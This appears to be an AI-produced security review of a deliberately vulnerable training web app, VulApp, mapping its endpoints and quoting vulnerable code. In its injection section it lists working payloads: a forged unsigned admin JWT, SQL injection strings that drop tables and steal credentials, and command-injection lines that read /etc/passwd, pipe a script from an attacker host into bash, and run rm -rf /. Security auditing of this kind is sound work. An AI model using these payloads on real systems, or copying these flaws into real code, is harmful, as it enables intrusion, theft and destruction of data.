# VulApp Security Analysis Report

**Target:** VulApp / TechviFlaw Application
**Analysis Type:** Comprehensive Security Code Review
**Scope:** Network-Accessible Attack Surface

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope.

### In-Scope: Network-Reachable Components

A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving:

- **Backend API Server:** Express.js server on port 5001 - All routes defined in `/repos/VulApp/backend/routes/` are network-accessible
- **Frontend Web Server:** Vite dev server on port 5173 - React SPA with client-side routing
- **Static File Serving:** `/uploads/*` route serving uploaded files without authentication
- **Public API Endpoints:** Authentication, project, file, debug, utility, and payment routes
- **Internal Misconfigured Endpoints:** Debug endpoints, admin panels accidentally exposed via query parameters

### Out-of-Scope: Locally Executable Only

- **Database Initialization:** `/repos/VulApp/backend/db.js` - SQLite schema creation, not network-accessible
- **Build Configuration:** `/repos/VulApp/frontend/vite.config.js` - Development server config only
- **Docker Configuration:** Build-time files not runtime-accessible
- **CLI Scripts:** No CLI tools found in this codebase

---

## 1. Executive Summary

This application, named **VulApp** (also referenced as **TechviFlaw**), is a deliberately vulnerable full-stack web application designed for security training and penetration testing practice. The codebase contains **over 27 documented vulnerabilities** spanning all OWASP Top 10 categories, representing an extremely poor security posture with no effective controls in place.

The backend is built on Node.js/Express 5.2.1 with SQLite3 database, while the frontend uses React 19 with Vite. The architecture follows a standard SPA + REST API pattern deployed via Docker Compose. Critical security failures include plaintext password storage, complete JWT bypass via "none" algorithm, hardcoded secrets ("secret123"), SQL injection, command injection, and missing authorization checks on all resource operations.

**Most Critical Attack Surfaces:**

1. **Authentication Bypass (CRITICAL):** The JWT implementation accepts unsigned tokens via the "none" algorithm bypass, allowing attackers to forge arbitrary identities including admin access. This is compounded by a weak, hardcoded secret.

2. **Injection Vulnerabilities (CRITICAL):** SQL injection in project search, command injection in ping utility, and stored XSS in project descriptions create multiple pathways for code execution and data theft.

3. **Broken Access Control (CRITICAL):** No authorization checks exist on any project operations. Any authenticated user can read, modify, or delete any other user's projects.

4. **Sensitive Data Exposure (CRITICAL):** Debug endpoints expose JWT secrets, plaintext passwords, and system configuration without authentication. Passwords are stored in plaintext.

5. **Remote Code Execution (CRITICAL):** Command injection in the ping endpoint and unrestricted file uploads allow arbitrary code execution on the server.

---

## 2. Architecture & Technology Stack

**TASK AGENT COORDINATION:** Findings from Architecture Scanner Agent (Phase 1)

### Framework & Language

| Component | Technology | Version | File |
|-----------|------------|---------|------|
| Frontend Framework | React | 19.2.4 | `/repos/VulApp/frontend/package.json` |
| Backend Framework | Express.js | 5.2.1 | `/repos/VulApp/backend/server.js` |
| Runtime | Node.js | 22 | `/repos/VulApp/backend/Dockerfile` |
| Build Tool | Vite | 8.0.1 | `/repos/VulApp/frontend/vite.config.js` |
| Router | React Router DOM | 7.13.1 | `/repos/VulApp/frontend/src/App.jsx` |
| HTTP Client | Axios | 1.13.6 | Both frontend and backend |
| Database | SQLite3 | 6.0.1 | `/repos/VulApp/backend/db.js` |
| File Upload | Multer | 2.1.1 | `/repos/VulApp/backend/routes/files.js` |
| Auth Library | jsonwebtoken | 9.0.3 | `/repos/VulApp/backend/middleware/auth.js` |

**Security Implications:** The technology stack contains no modern security frameworks. Express.js 5.x is used without Helmet or other security middleware. React 19's built-in XSS protections are bypassed via `dangerouslySetInnerHTML` throughout the application. The Node 22 runtime in production is a full image with build tools, expanding the attack surface if container breakout occurs.

### Architectural Pattern

**Pattern:** SPA (Single Page Application) + REST API

```
┌─────────────────────────────────────────────────────────────────┐
│                         Frontend (Port 5173)                     │
│  ┌─────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │
│  │ Login   │  │Dashboard │  │Project   │  │ Subscription     │  │
│  │ Page    │  │ Page     │  │Details   │  │ Page            │  │
│  └────┬────┘  └────┬─────┘  └────┬─────┘  └────────┬─────────┘  │
│       │            │             │                 │             │
│       └────────────┴─────────────┴─────────────────┘             │
│                          │ Axios API Calls                       │
└──────────────────────────┼───────────────────────────────────────┘
                           │ HTTP (No TLS)
┌──────────────────────────┼───────────────────────────────────────┐
│                          ▼          Backend (Port 5001)           │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                    Express.js Router                      │   │
│  │  ┌────────┐ ┌─────────┐ ┌────────┐ ┌────────┐ ┌────────┐ │   │
│  │  │ /auth  │ │/projects│ │ /files │ │ /debug │ │ /utils │ │   │
│  │  └────────┘ └─────────┘ └────────┘ └────────┘ └────────┘ │   │
│  └──────────────────────────────────────────────────────────┘   │
│                           │                                     │
│  ┌────────────────────────┼─────────────────────────────────┐  │
│  │                   SQLite3 Database                        │  │
│  │  users(id, email, password, plan_type)                    │  │
│  │  projects(id, name, description, owner_id, is_public)    │  │
│  │  files(id, filename, filepath, project_id, owner_id)     │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

**Trust Boundary Analysis:** No trust boundaries exist. The entire application operates on a single trust level with no isolation between components. The CORS configuration (`origin: '*'`) allows any external domain to make API requests.

### Critical Security Components

| Component | Location | Purpose | Security Posture |
|-----------|----------|---------|------------------|
| Auth Middleware | `/repos/VulApp/backend/middleware/auth.js` | JWT validation | BROKEN - Accepts unsigned tokens |
| CORS Config | `/repos/VulApp/backend/server.js:11` | Cross-origin requests | WIDE OPEN - `origin: '*'` |
| JWT Secret | `/repos/VulApp/backend/middleware/auth.js:4` | Token signing | HARDCODED - `secret123` |
| Debug Endpoint | `/repos/VulApp/backend/routes/debug.js` | System info | PUBLIC - Exposes secrets |
| Error Handler | `/repos/VulApp/backend/server.js:82` | Error responses | EXPOSES - Stack traces |

---

## 3. Authentication & Authorization Deep Dive

**TASK AGENT COORDINATION:** Findings from Security Pattern Hunter Agent (Phase 1)

### Authentication Mechanisms

#### 3.1 JWT Authentication (CRITICAL VULNERABILITIES)

**JWT Secret - Hardcoded and Weak**

**File:** `/repos/VulApp/backend/middleware/auth.js`
**Lines 3-4:**
```javascript
// INSECURE: Weak/Hardcoded secret
const JWT_SECRET = 'secret123';
```

**Security Impact:** The JWT secret "secret123" is trivially guessable and hardcoded in source code. An attacker can forge valid tokens for any user account without any reconnaissance.

**JWT "none" Algorithm Bypass (Complete Auth Bypass)**

**File:** `/repos/VulApp/backend/middleware/auth.js`
**Lines 14-30:**
```javascript
// VULNERABILITY: JWT NONE ALGORITHM BYPASS
// Accepts tokens with alg: "none" (unsigned)
// Attacker can forge any identity without the secret
try {
  const parts = token.split('.');
  if (parts.length >= 2) {
    const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
    if (header.alg === 'none' || header.alg === 'None') {
      // VULNERABILITY: Trusting unsigned token
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      console.log(`[VULN] Accepted unsigned JWT for user: ${payload.email}`);
      req.user = payload;
      return next();
    }
  }
} catch (e) {
  // Fall through to normal verification
}
```

**Security Impact:** This is a **complete authentication bypass**. Attackers can forge unsigned JWT tokens with arbitrary payloads. Example forged token:
```
Header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
Payload: eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBleGFtcGxlLmNvbSIsInBsYW4iOiJhZG1pbiJ9
```
This token would grant admin access without knowing any secrets.

**JWT Token Creation (No Expiration)**

**File:** `/repos/VulApp/backend/routes/auth.js`
**Line 37:**
```javascript
const token = jwt.sign({ id: user.id, email: user.email, plan: user.plan_type }, JWT_SECRET);
```

**Security Impact:** Tokens have no expiration (`expiresIn` not set). Stolen tokens remain valid forever with no revocation capability.

**JWT Secret Export**

**File:** `/repos/VulApp/backend/middleware/auth.js`
**Line 44:**
```javascript
module.exports = { authenticate, JWT_SECRET };
```

**Security Impact:** JWT secret is exported and used by debug endpoint, leaking it via `GET /api/debug`.

#### 3.2 Password Handling (PLAINTEXT - CRITICAL)

**Password Storage**

**File:** `/repos/VulApp/backend/db.js`
**Lines 9-14:**
```javascript
db.run(`CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT UNIQUE,
  password TEXT,
  plan_type TEXT DEFAULT 'free'
)`);
```

**Password Comparison**

**File:** `/repos/VulApp/backend/routes/auth.js`
**Lines 32-35:**
```javascript
db.get(`SELECT * FROM users WHERE email = ? AND password = ?`, [email, password], (err, user) => {
  if (err || !user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
```

**Security Impact:** Passwords are stored in **plaintext** with no hashing. The test user credentials (`test@example.com` / `123456`) demonstrate the complete lack of security. Anyone with database access can read all user credentials.

#### 3.3 All Authentication API Endpoints

| Method | Path | File:Line | Auth Required | Vulnerability |
|--------|------|-----------|---------------|---------------|
| POST | `/api/auth/register` | `routes/auth.js:9` | No | User enumeration |
| POST | `/api/auth/login` | `routes/auth.js:29` | No | No rate limiting |
| GET | `/api/auth/profile` | `routes/auth.js:43` | Yes | IDOR possible |
| PUT | `/api/auth/profile` | `routes/auth.js:57` | Yes | Mass assignment |
| POST | `/api/auth/forgot-password` | `routes/auth.js:81` | No | Predictable token |
| POST | `/api/auth/reset-password` | `routes/auth.js:97` | No | No expiry check |

#### 3.4 Session Cookie Configuration

**NO HTTP-ONLY SECURE COOKIES ARE USED**

The application does not use cookies for session management. Instead:

| Aspect | Value |
|--------|-------|
| Session Storage | JWT in localStorage |
| HttpOnly Flag | NOT USED |
| Secure Flag | NOT USED |
| SameSite Flag | NOT USED |
| Cookie Location | `/repos/VulApp/frontend/src/services/api.js:15` |

**Token Storage Vulnerability**

**File:** `/repos/VulApp/frontend/src/pages/Login.jsx`
**Line 15:**
```javascript
localStorage.setItem('token', res.data.token);
```

**File:** `/repos/VulApp/frontend/src/services/api.js`
**Lines 8-14:**
```javascript
api.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

**Security Impact:** Tokens stored in localStorage are vulnerable to XSS attacks. Unlike httpOnly cookies, any JavaScript code (including malicious scripts injected via XSS) can read and exfiltrate tokens.

#### 3.5 Password Reset Flow (COMPLETELY BROKEN)

**Predictable Reset Token Generation**

**File:** `/repos/VulApp/backend/routes/auth.js`
**Lines 85-93:**
```javascript
router.post('/forgot-password', (req, res) => {
  const { email } = req.body;

  // VULNERABILITY: Predictable token based on timestamp
  const resetToken = Buffer.from(`${email}:${Date.now()}`).toString('base64');
  console.log(`[VULN] Password reset token for ${email}: ${resetToken}`);

  res.json({
    message: 'Password reset link sent (not really)',
    // VULNERABILITY: Token leaked in response
    debug_token: resetToken
  });
});
```

**Security Impact:**
- Token is `base64(email:timestamp)` - easily predictable
- Token printed to server logs
- Token leaked in API response body
- No expiration or one-time use enforcement

**Password Reset Without Validation**

**File:** `/repos/VulApp/backend/routes/auth.js`
**Lines 97-112:**
```javascript
router.post('/reset-password', (req, res) => {
  const { token, new_password } = req.body;

  try {
    const decoded = Buffer.from(token, 'base64').toString('ascii');
    const [email] = decoded.split(':');
    // VULNERABILITY: No token expiration or one-time use check
    db.run(`UPDATE users SET password = ? WHERE email = ?`, [new_password, email], ...);
  } catch (err) {
    res.status(400).json({ error: 'Invalid token' });
  }
});
```

### Authorization Model (NON-EXISTENT)

#### No RBAC System

The application has **no role-based access control system**. The only "role" is the `plan_type` field in the users table, which is:
1. User-controllable via mass assignment
2. Has no enforcement mechanism anywhere in the code

#### IDOR Vulnerabilities (Broken Object-Level Authorization)

**IDOR - Project Read**

**File:** `/repos/VulApp/backend/routes/projects.js`
**Lines 15-22:**
```javascript
router.get('/:id', (req, res) => {
  const projectId = req.params.id;
  // VULNERABILITY: Missing ownership check
  db.get(`SELECT * FROM projects WHERE id = ?`, [projectId], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.status(404).json({ error: 'Project not found' });
    res.json(row);
  });
});
```

**Security Impact:** Any authenticated user can view any project by ID, including private projects.

**IDOR - Project Delete**

**File:** `/repos/VulApp/backend/routes/projects.js`
**Lines 53-60:**
```javascript
router.delete('/:id', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
  // VULNERABILITY: No ownership check
  db.run(`DELETE FROM projects WHERE id = ?`, [req.params.id], ...);
});
```

**Security Impact:** Any authenticated user can delete any project.

**IDOR - Project Update**

**File:** `/repos/VulApp/backend/routes/projects.js`
**Lines 89-100:**
```javascript
router.put('/:id', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
  const { name, description, is_public } = req.body;
  // VULNERABILITY: No ownership check + stored XSS via description
  db.run(`UPDATE projects SET name = ?, description = ?, is_public = ? WHERE id = ?`, ...);
});
```

**Security Impact:** Any authenticated user can modify any project, including injecting malicious content via the description field.

#### Admin Panel Bypass (Broken Access Control)

**File:** `/repos/VulApp/backend/routes/debug.js`
**Lines 34-47:**
```javascript
router.get('/admin', (req, res) => {
  const { admin } = req.query;
  // VULNERABILITY: Weak protection via query parameter
  if (admin === 'true') {
    db.all(`SELECT * FROM users`, (err, users) => {
      res.json({
        message: 'Welcome to the Admin Panel!',
        total_users: users.length,
        users: users // LEAKS passwords in plaintext
      });
    });
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
});
```

**Security Impact:** The "admin" protection is a simple query parameter check. Anyone can access the admin panel with `?admin=true` and receive all user records including plaintext passwords.

### SSO/OAuth/OIDC Flows

**NOT IMPLEMENTED** - No OAuth, OIDC, or SSO flows exist in this codebase.

### Security Middleware Analysis

**CORS Wildcard (WIDE OPEN)**

**File:** `/repos/VulApp/backend/server.js`
**Lines 10-11:**
```javascript
// VULNERABILITY: CORS set to *
app.use(cors({ origin: '*' }));
```

**Security Impact:** Any website can make XMLHttpRequests to this API, enabling CSRF attacks and data exfiltration.

**NO CSRF PROTECTION:** No CSRF tokens, no `same-site` cookie attribute, no double-submit cookie pattern.

**NO SECURITY HEADERS:** No `X-Content-Type-Options`, `X-Frame-Options`, `X-XSS-Protection`, `Content-Security-Policy`, `Strict-Transport-Security`, or `Referrer-Policy`.

**NO RATE LIMITING:** No rate limiting on any endpoint, including `/register` and `/login`, enabling brute force attacks.

---

## 4. Data Security & Storage

**TASK AGENT COORDINATION:** Findings from Data Security Auditor Agent (Phase 2)

### Database Security

**SQLite with No Encryption at Rest**

**File:** `/repos/VulApp/backend/db.js`
**Lines 1-5:**
```javascript
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const dbPath = path.resolve(__dirname, 'database.sqlite');
const db = new sqlite3.Database(dbPath);
```

**Security Impact:** The SQLite database file `database.sqlite` is stored unencrypted on disk. Anyone with filesystem access can read all user data including plaintext passwords.

**Query Parameterization (INCONSISTENT)**

| Endpoint | File:Line | Status |
|----------|-----------|--------|
| User Registration | `routes/auth.js:15` | Parameterized ✓ |
| User Login | `routes/auth.js:32` | Parameterized ✓ |
| Project Search | `routes/projects.js:29` | **String concatenation ✗** |
| Password Reset | `routes/auth.js:106` | Parameterized ✓ |

### Data Flow Security

**Stored XSS via Project Description**

**Sink File:** `/repos/VulApp/backend/routes/projects.js`
**Lines 39-44:**
```javascript
router.post('/', (req, res) => {
  const { name, description, is_public } = req.body;
  // VULNERABILITY: No XSS sanitization
  db.run(`INSERT INTO projects (name, description, owner_id, is_public) VALUES (?, ?, ?, ?)`,
    [name, description, req.user.id, is_public ? 1 : 0], ...);
```

**Render Context (Frontend XSS Sinks)**

**File:** `/repos/VulApp/frontend/src/pages/Dashboard.jsx`
**Lines 75-78:**
```jsx
<div
  className="project-desc"
  dangerouslySetInnerHTML={{ __html: p.description }}
  ...
/>
```

**File:** `/repos/VulApp/frontend/src/pages/ProjectDetails.jsx`
**Lines 84-87:**
```jsx
<div
  dangerouslySetInnerHTML={{ __html: project.description }}
  ...
/>
```

**Security Impact:** User-provided HTML in project descriptions is stored and rendered without sanitization, allowing stored XSS attacks.

### Multi-tenant Data Isolation

**NO MULTI-TENANCY EXISTS** - The application is single-tenant. However, the `owner_id` field exists but is never enforced:

**Missing Authorization Check:**

**File:** `/repos/VulApp/backend/routes/projects.js`
**Lines 15-22:**
```javascript
router.get('/:id', (req, res) => {
  const projectId = req.params.id;
  // MISSING: if (project.owner_id !== req.user.id && !project.is_public)
  db.get(`SELECT * FROM projects WHERE id = ?`, [projectId], (err, row) => {
```

**Security Impact:** Users can access other users' private projects due to missing ownership verification.

### Sensitive Data Handling

**Exposed via Debug Endpoint (No Auth Required)**

**File:** `/repos/VulApp/backend/routes/debug.js`
**Lines 8-18:**
```javascript
router.get('/debug', (req, res) => {
  res.json({
    message: 'Debug information',
    config: {
      db_type: 'sqlite',
      db_path: path.resolve(__dirname, '../database.sqlite'),
      jwt_secret: JWT_SECRET // LEAKS JWT SECRET
    },
    system: process.env // LEAKS ALL ENV VARS
  });
});
```

**Security Impact:** JWT secret, database path, and all environment variables are exposed without authentication.

**Passwords Returned in Admin Response**

**File:** `/repos/VulApp/backend/routes/debug.js`
**Lines 41-47:**
```javascript
db.all(`SELECT * FROM users`, (err, users) => {
  res.json({
    message: 'Welcome to the Admin Panel!',
    total_users: users.length,
    users: users // LEAKS plaintext passwords
  });
});
```

**Error Handler Exposes Stack Traces**

**File:** `/repos/VulApp/backend/server.js`
**Lines 77-84:**
```javascript
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    error: 'Internal Server Error',
    message: err.message,
    stack: err.stack // EXPOSES internal paths
  });
});
```

---

## 5. Attack Surface Analysis

**TASK AGENT COORDINATION:** Findings from Entry Point Mapper Agent (Phase 1)

### External Entry Points

#### PUBLIC ENDPOINTS (No Authentication Required)

| Method | Path | File:Line | Vulnerability |
|--------|------|-----------|---------------|
| POST | `/api/auth/register` | `routes/auth.js:9` | User enumeration |
| POST | `/api/auth/login` | `routes/auth.js:29` | No rate limiting |
| POST | `/api/auth/forgot-password` | `routes/auth.js:81` | Predictable token |
| POST | `/api/auth/reset-password` | `routes/auth.js:97` | No token expiry |
| GET | `/api/projects/:id` | `routes/projects.js:15` | **IDOR** |
| GET | `/api/projects/search/name?name=` | `routes/projects.js:26` | **SQL Injection** |
| GET | `/api/projects/export/csv` | `routes/projects.js:68` | CSV Injection |
| GET | `/api/files/project/:id` | `routes/files.js:39` | IDOR |
| GET | `/api/files/download?name=` | `routes/files.js:52` | **Path Traversal** |
| GET | `/api/debug` | `routes/debug.js:8` | **Secrets exposure** |
| GET | `/api/fetch-url?url=` | `routes/debug.js:21` | **SSRF** |
| GET | `/api/admin?admin=true` | `routes/debug.js:35` | **Admin bypass** |
| GET | `/api/docs` | `server.js:37` | Test creds exposure |
| GET | `/api/utils/ping?host=` | `routes/utils.js:11` | **Command Injection** |
| POST | `/api/utils/merge` | `routes/utils.js:47` | **Prototype Pollution** |
| GET | `/api/utils/redirect?url=` | `routes/utils.js:70` | Open Redirect |
| GET | `/api/utils/lang?lang=` | `routes/utils.js:85` | Header Injection |
| POST | `/api/utils/validate-email` | `routes/utils.js:100` | ReDoS |
| GET | `/uploads/*` | `server.js:74` | Unrestricted files |

#### AUTHENTICATED ENDPOINTS (Require Bearer Token)

| Method | Path | File:Line | Vulnerability |
|--------|------|-----------|---------------|
| GET | `/api/auth/profile` | `routes/auth.js:43` | IDOR |
| PUT | `/api/auth/profile` | `routes/auth.js:57` | **Mass Assignment** |
| GET | `/api/projects` | `routes/projects.js:6` | None |
| POST | `/api/projects` | `routes/projects.js:39` | **Stored XSS** |
| PUT | `/api/projects/:id` | `routes/projects.js:89` | IDOR + XSS |
| DELETE | `/api/projects/:id` | `routes/projects.js:53` | IDOR |
| POST | `/api/files/upload` | `routes/files.js:22` | Unrestricted upload |
| POST | `/api/subscribe` | `routes/payment.js:6` | **Payment bypass** |

### Internal Service Communication

**No internal services exist** - This is a monolithic application with direct database access from all routes. Trust relationships:
- All routes trust the database connection
- No service-to-service authentication
- No mTLS or API keys for internal communication

### Input Validation Patterns

**MINIMAL INPUT VALIDATION EXISTS**

| Endpoint | Validation | File:Line |
|----------|------------|-----------|
| Registration | Email presence check | `routes/auth.js:10-11` |
| Login | Email/password presence | `routes/auth.js:30-31` |
| Project search | None | `routes/projects.js:29` |
| File download | None | `routes/files.js:57` |
| Ping | None | `routes/utils.js:16` |
| Merge | None | `routes/utils.js:49` |

**Security Impact:** User input is passed directly to dangerous operations without sanitization or validation.

### Background Processing

**NO BACKGROUND PROCESSING** - All operations are synchronous request-response. No job queues or async workers exist in this codebase.

---

## 6. Infrastructure & Operational Security

### Secrets Management

**HARDCODED SECRETS THROUGHOUT**

| Secret | Location | Value |
|--------|----------|-------|
| JWT Secret | `middleware/auth.js:4` | `secret123` |
| Test Password | `db.js:38` | `123456` |
| Database Path | `db.js:4` | Relative path |

**Security Impact:** No secret rotation possible. All secrets in source code, committed to git.

### Configuration Security

**Docker Compose Configuration**

**File:** `/repos/VulApp/docker-compose.yml`:
```yaml
services:
  backend:
    build: ./backend
    ports:
      - "5001:5001"  # Exposed to all interfaces
    environment:
      - NODE_ENV=development
```

**Security Impact:**
- Services bound to `0.0.0.0` (all interfaces)
- `NODE_ENV=development` enables debug features
- No TLS/HTTPS configuration
- No security headers in Nginx or Ingress

**No HSTS, CSP, or Security Headers Configured** - No infrastructure-level security headers.

### External Dependencies

| Dependency | Version | Vulnerability Risk |
|-------------|---------|-------------------|
| Express.js | 5.2.1 | Legacy version |
| jsonwebtoken | 9.0.3 | Current |
| multer | 2.1.1 | File upload issues |
| axios | 1.13.6 | SSRF via user input |
| sqlite3 | 6.0.1 | Unencrypted storage |

### Monitoring & Logging

**Minimal Logging - No Security Monitoring**

**File:** `/repos/VulApp/backend/middleware/logger.js`:
```javascript
// Generic request logging only
```

**Security Event Visibility:** None - no audit logging, no security event monitoring, no intrusion detection.

---

## 7. Overall Codebase Indexing

The VulApp codebase is organized as a **containerized full-stack application** with the following structure:

```
/repos/VulApp/
├── backend/                    # Express.js API server
│   ├── server.js              # Main entry point + route registration
│   ├── db.js                  # SQLite database initialization
│   ├── middleware/
│   │   ├── auth.js           # JWT authentication (VULNERABLE)
│   │   └── logger.js         # Request logging
│   └── routes/
│       ├── auth.js           # Auth endpoints (register, login, reset)
│       ├── projects.js       # Project CRUD + search (SQLi, XSS, IDOR)
│       ├── files.js          # Upload/download (path traversal, RCE)
│       ├── payment.js        # Subscription (business logic bypass)
│       ├── debug.js          # Debug info + SSRF
│       └── utils.js          # Utilities (command injection, pollution)
├── frontend/                  # React SPA
│   ├── src/
│   │   ├── pages/
│   │   │   ├── Dashboard.jsx        # XSS sink via dangerouslySetInnerHTML
│   │   │   ├── ProjectDetails.jsx   # XSS sink via dangerouslySetInnerHTML
│   │   │   ├── Login.jsx            # Token stored in localStorage
│   │   │   ├── Register.jsx         # Registration form
│   │   │   └── Subscription.jsx      # Subscription page
│   │   ├── services/
│   │   │   └── api.js               # Axios instance with Bearer token
│   │   └── App.jsx                  # React Router + main layout
│   └── vite.config.js               # Build configuration
├── docker-compose.yml       # Container orchestration
├── Dockerfile               # Backend container definition
└── hackplan.md             # Penetration testing plan (for reference)
```

**Key Observations:**

1. **Small Codebase:** ~1,500 lines of code across all files - easily auditable but extensively vulnerable
2. **No Build Process:** Frontend served directly via Vite dev server in production
3. **No Testing Infrastructure:** No test files, no CI/CD security scanning
4. **No Security Libraries:** No Helmet, no OWASP ESAPI, no input validation libraries
5. **Intentional Vulnerabilities:** Comments throughout code mark vulnerabilities as "[VULN]" indicating deliberate design
6. **Hardcoded Test Data:** Database pre-seeded with test credentials in `db.js:38`

---

## 8. Critical File Paths

### Configuration Files
- `/repos/VulApp/docker-compose.yml` - Container orchestration
- `/repos/VulApp/backend/Dockerfile` - Backend container (node:22 full image)
- `/repos/VulApp/frontend/Dockerfile` - Frontend container
- `/repos/VulApp/backend/package.json` - Backend dependencies
- `/repos/VulApp/frontend/package.json` - Frontend dependencies

### Authentication & Authorization
- `/repos/VulApp/backend/middleware/auth.js` - JWT middleware (critical vulnerabilities)
- `/repos/VulApp/backend/routes/auth.js` - Auth endpoints (registration, login, reset)
- `/repos/VulApp/frontend/src/pages/Login.jsx` - Login page (localStorage token)
- `/repos/VulApp/frontend/src/services/api.js` - Axios interceptor

### API & Routing
- `/repos/VulApp/backend/server.js` - Express server + route registration
- `/repos/VulApp/backend/routes/projects.js` - Project endpoints (SQLi, XSS, IDOR)
- `/repos/VulApp/backend/routes/files.js` - File endpoints (path traversal, upload)
- `/repos/VulApp/backend/routes/debug.js` - Debug endpoints (SSRF, secrets)
- `/repos/VulApp/backend/routes/utils.js` - Utility endpoints (command injection, pollution)
- `/repos/VulApp/backend/routes/payment.js` - Payment endpoint (business logic bypass)
- `/repos/VulApp/frontend/src/App.jsx` - React Router

### Data Models & Database
- `/repos/VulApp/backend/db.js` - SQLite database setup + schema
- `/repos/VulApp/backend/database.sqlite` - SQLite database file (if exists)

### Frontend Components (XSS Sinks)
- `/repos/VulApp/frontend/src/pages/Dashboard.jsx` - Project list with dangerouslySetInnerHTML
- `/repos/VulApp/frontend/src/pages/ProjectDetails.jsx` - Project details with dangerouslySetInnerHTML
- `/repos/VulApp/frontend/src/pages/Register.jsx` - Registration form
- `/repos/VulApp/frontend/src/pages/Subscription.jsx` - Subscription page

### Security Middleware
- `/repos/VulApp/backend/middleware/logger.js` - Request logging

---

## 9. XSS Sinks and Render Contexts

**TASK AGENT COORDINATION:** Findings from XSS/Injection Sink Hunter Agent (Phase 2)

### XSS Sinks (Stored - Critical)

#### Sink 1: Project Description in Dashboard

**File:** `/repos/VulApp/frontend/src/pages/Dashboard.jsx`
**Lines 75-78:**
```jsx
<div
  className="project-desc"
  dangerouslySetInnerHTML={{ __html: p.description }}
  onClick={() => handleProjectClick(p.id)}
  style={{ cursor: 'pointer' }}
/>
```

**Render Context:** HTML Body Context - Direct innerHTML injection
**User Input Source:** POST `/api/projects` → stored in `projects.description` → rendered raw
**Impact:** Stored XSS - script executes for all users viewing the dashboard

#### Sink 2: Project Description in Project Details

**File:** `/repos/VulApp/frontend/src/pages/ProjectDetails.jsx`
**Lines 84-87:**
```jsx
<div
  className="project-details-description"
  dangerouslySetInnerHTML={{ __html: project.description }}
>
</div>
```

**Render Context:** HTML Body Context - Direct innerHTML injection
**User Input Source:** PUT `/api/projects/:id` → stored in `projects.description` → rendered raw
**Impact:** Stored XSS - script executes for all users viewing project details

#### Sink 3: File Download Link with Unsanitized Filename

**File:** `/repos/VulApp/frontend/src/pages/ProjectDetails.jsx`
**Lines 106-110:**
```jsx
<a
  href={`http://localhost:5001/uploads/${f.filename}`}
  target="_blank"
  rel="noreferrer"
  download
>
```

**Render Context:** URL Attribute Context (href)
**User Input Source:** File upload preserves original filename
**Impact:** Potential XSS if filename is reflected without encoding (e.g., `"><script>alert(1)</script>.jpg`)

### Injection Sinks

#### SQL Injection in Project Search

**File:** `/repos/VulApp/backend/routes/projects.js`
**Lines 26-29:**
```javascript
router.get('/search/name', (req, res) => {
  const name = req.query.name || '';
  // VULNERABILITY: Raw string concatenation
  const query = `SELECT * FROM projects WHERE name LIKE '%${name}%'`;
```

**Impact:** Full database extraction, authentication bypass, potential data destruction

**Example Payloads:**
- `' OR '1'='1` - Returns all projects
- `'; DROP TABLE projects; --` - Data destruction
- `' UNION SELECT id, email, password FROM users--` - Credential theft

### Command Injection Sink

**File:** `/repos/VulApp/backend/routes/utils.js`
**Lines 11-19:**
```javascript
router.get('/ping', (req, res) => {
  const { host } = req.query;
  if (!host) return res.status(400).json({ error: 'Host parameter is required' });

  // VULNERABILITY: Direct shell command injection
  const cmd = `ping -c 2 ${host}`;
  console.log(`[VULN] Executing command: ${cmd}`);

  exec(cmd, { timeout: 10000 }, (err, stdout, stderr) => {
```

**Impact:** Remote Code Execution on the server

**Example Payloads:**
- `; cat /etc/passwd` - Read system files
- `; curl https://attacker.com/shell.sh | bash` - Download malware
- `; rm -rf /` - System destruction (if permissions allow)

### Prototype Pollution Sink

**File:** `/repos/VulApp/backend/routes/utils.js`
**Lines 35-51:**
```javascript
function unsafeMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      unsafeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

router.post('/merge', (req, res) => {
  const baseConfig = { theme: 'dark', lang: 'en' };
  // VULNERABILITY: No __proto__ validation
  const merged = unsafeMerge(baseConfig, req.body);
```

**Impact:** Can inject properties into all JavaScript objects (e.g., `{"__proto__": {"isAdmin": true}}`)

### Mass Assignment Sink

**File:** `/repos/VulApp/backend/routes/auth.js`
**Lines 57-67:**
```javascript
router.put('/profile', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });

  // VULNERABILITY: Accepting ALL fields from request body
  const updates = req.body;
  const fields = Object.keys(updates).map(k => `${k} = ?`).join(', ');
  const values = Object.values(updates);

  const query = `UPDATE users SET ${fields} WHERE id = ?`;
```

**Impact:** Privilege escalation by modifying `plan_type`, password changes for other users

---

## 10. SSRF Sinks

**TASK AGENT COORDINATION:** Findings from SSRF/External Request Tracer Agent (Phase 2)

### SSRF Sink: Arbitrary URL Fetch

**File:** `/repos/VulApp/backend/routes/debug.js`
**Lines 21-31:**
```javascript
router.get('/fetch-url', async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).json({ error: 'URL is required' });

  try {
    console.log(`Fetching URL (SSRF): ${url}`);
    const response = await axios.get(url);
    res.send(response.data);
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch URL', message: err.message });
  }
});
```

**User Input Source:** `req.query.url` parameter
**Validation:** NONE - only checks that a URL is provided
**Impact:**
- Internal network scanning
- Cloud metadata theft (`http://169.254.169.254/latest/meta-data/`)
